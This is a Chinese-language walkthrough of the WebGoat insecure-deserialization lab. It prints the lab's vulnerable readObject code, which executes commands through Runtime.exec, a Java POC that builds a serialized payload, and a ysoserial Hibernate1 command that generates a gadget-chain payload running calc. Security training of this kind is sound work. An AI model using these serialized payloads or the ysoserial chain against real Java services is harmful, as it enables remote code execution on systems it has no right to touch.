WebGoat-Java反序列化 源项目：webgoat-server-8.2.2（https://github.com/WebGoat/WebGoat/releases）
Jdk：&gt;=15（11不行）
启动命令：
java -jar webgoat-server-8.2.2.jar http://127.0.0.1:8080/WebGoat/login
题目java文件：webgoat-server-8.2.2.jar 解包，webgoat-server-8.2.2/BOOT-INF/lib/insecure-deserialization-8.2.2.jar再次解包，org/org.owasp.webgoat.deserialization下的文件
分析源码 // InsecureDeserializationTask package org.owasp.webgoat.deserialization; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.util.Base64; import org.dummy.insecure.framework.VulnerableTaskHolder; import org.owasp.webgoat.assignments.AssignmentEndpoint; import org.owasp.webgoat.assignments.AssignmentHints; import org.owasp.webgoat.assignments.AttackResult; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.bind.annotation.RestController; @RestController @AssignmentHints({&#34;insecure-deserialization.hints.1&#34;, &#34;insecure-deserialization.hints.2&#34;, &#34;insecure-deserialization.hints.3&#34;}) public class InsecureDeserializationTask extends AssignmentEndpoint { public InsecureDeserializationTask() { } @PostMapping({&#34;/InsecureDeserialization/task&#34;}) @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException { String b64token = token.replace(&#39;-&#39;, &#39;+&#39;).replace(&#39;_&#39;, &#39;/&#39;); long before; long after; try { label71: { // base64解码，通过字节流反序列化对象 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token))); AttackResult var10; label64: { label63: { try { before = System.currentTimeMillis(); Object o = ois.readObject(); // 类必须是VulnerableTaskHolder if (!(o instanceof VulnerableTaskHolder)) { if (o instanceof String) { var10 = this.failed(this).feedback(&#34;insecure-deserialization.stringobject&#34;).build(); break label64; } var10 = this.failed(this).feedback(&#34;insecure-deserialization.wrongobject&#34;).build(); break label63; } after = System.currentTimeMillis(); } catch (Throwable var12) { try { ois.close(); } catch (Throwable var11) { var12.addSuppressed(var11); } throw var12; } ois.close(); break label71; } ois.close(); return var10; } ois.close(); return var10; } } catch (InvalidClassException var13) { return this.failed(this).feedback(&#34;insecure-deserialization.invalidversion&#34;).build(); } catch (IllegalArgumentException var14) { return this.failed(this).feedback(&#34;insecure-deserialization.expired&#34;).build(); } catch (Exception var15) { return this.failed(this).feedback(&#34;insecure-deserialization.invalidversion&#34;).build(); } int delay = (int)(after - before); if (delay &gt; 7000) { return this.failed(this).build(); } else { return delay &lt; 3000 ? this.failed(this).build() : this.success(this).build(); } } } 这里需要Java序列化的类为VulnerableTaskHolder，跟进
// VulnerableTaskHolder package org.dummy.insecure.framework; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.ObjectInputStream; import java.io.Serializable; import java.time.LocalDateTime; import org.slf4j.Logger; import org.slf4j.LoggerFactory; public class VulnerableTaskHolder implements Serializable { private static final Logger log = LoggerFactory.getLogger(VulnerableTaskHolder.class); private static final long serialVersionUID = 2L; private String taskName; private String taskAction; // taskAction字符串 private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) { this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); } public String toString() { return &#34;VulnerableTaskHolder [taskName=&#34; + this.taskName + &#34;, taskAction=&#34; + this.taskAction + &#34;, requestedExecutionTime=&#34; + this.requestedExecutionTime + &#34;]&#34;; } // 重写了readObject private void readObject(ObjectInputStream stream) throws Exception { stream.defaultReadObject(); log.info(&#34;restoring task: {}&#34;, this.taskName); log.info(&#34;restoring time: {}&#34;, this.requestedExecutionTime); if (this.requestedExecutionTime != null &amp;&amp; (this.requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10L)) || this.requestedExecutionTime.isAfter(LocalDateTime.now()))) { log.debug(this.toString()); throw new IllegalArgumentException(&#34;outdated&#34;); } else { // taskAction满足以sleep或ping开头且长度小于22时，就会将taskAction中的内容以系统命令来执行 if ((this.taskAction.startsWith(&#34;sleep&#34;) || this.taskAction.startsWith(&#34;ping&#34;)) &amp;&amp; this.taskAction.length() &lt; 22) { log.info(&#34;about to execute: {}&#34;, this.taskAction); // 执行（Runtime） try { Process p = Runtime.getRuntime().exec(this.taskAction); // 从进程的标准输出流中读取数据 BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; // 这个循环会逐行读取进程的标准输出，并将每一行打印到控制台 while((line = in.readLine()) != null) { log.info(line); } } catch (IOException var5) { log.error(&#34;IO Exception&#34;, var5); } } } } } 编写POC VulnerableTaskHolder中不需要的删掉
// VulnerableTaskHolder package org.dummy.insecure.framework; import java.io.Serializable; import java.time.LocalDateTime; public class VulnerableTaskHolder implements Serializable { private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName,String taskAction) { this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); } } package需要相同，不然会造成Serializable ID不一致
// poc package org.dummy.insecure.framework; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.util.Base64; public class poc { public static void main(String[] args) throws IOException { VulnerableTaskHolder vth = new VulnerableTaskHolder(&#34;sleep&#34;,&#34;sleep 5&#34;); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(vth); oos.close(); byte[] exploit = baos.toByteArray(); String payload = Base64.getEncoder().encodeToString(exploit); System.out.println(&#34;payload=&#34; + payload); } } ysoserial hibernate-core-5.4.28.Final.jar 将文件 hibernate-core-5.4.28.Final.jar 放在和 ysoserial-all.jar 同一个目录，弹计算器
java8 -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial-all.jar ysoserial.GeneratePayload Hibernate1 calc &gt; poc.bin 装个多个Java版本，java8是修改了java执行文件名
